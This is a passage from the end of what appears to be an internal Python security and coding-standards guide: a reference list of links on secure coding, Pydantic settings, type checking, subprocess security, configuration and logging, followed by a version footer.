---

## 10. References

### Python Security Resources
- [OWASP Python Security Project](https://owasp.org/www-project-python-security/)
- [Python Secure Coding Practices](https://securecodingpractices.com/python-secure-coding-best-practices/)
- [OpenStack Security Guidelines](https://security.openstack.org/guidelines/)

### Library Documentation
- [Pydantic Settings](https://docs.pydantic.dev/latest/concepts/pydantic_settings/)
- [Mypy Type Checking](https://mypy.readthedocs.io/)
- [subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

### Best Practices
- [12-Factor App Configuration](https://12factor.net/config)
- [Structured Logging Guide](https://www.honeycomb.io/blog/structured-logging-guide)
- [Python Exception Handling Patterns](https://inventivehq.com/error-handling-in-python-try-except-with-finally)

---

**Document Version**: 1.0
**Last Updated**: 2025-10-25
**Maintainer**: AI Backend Team
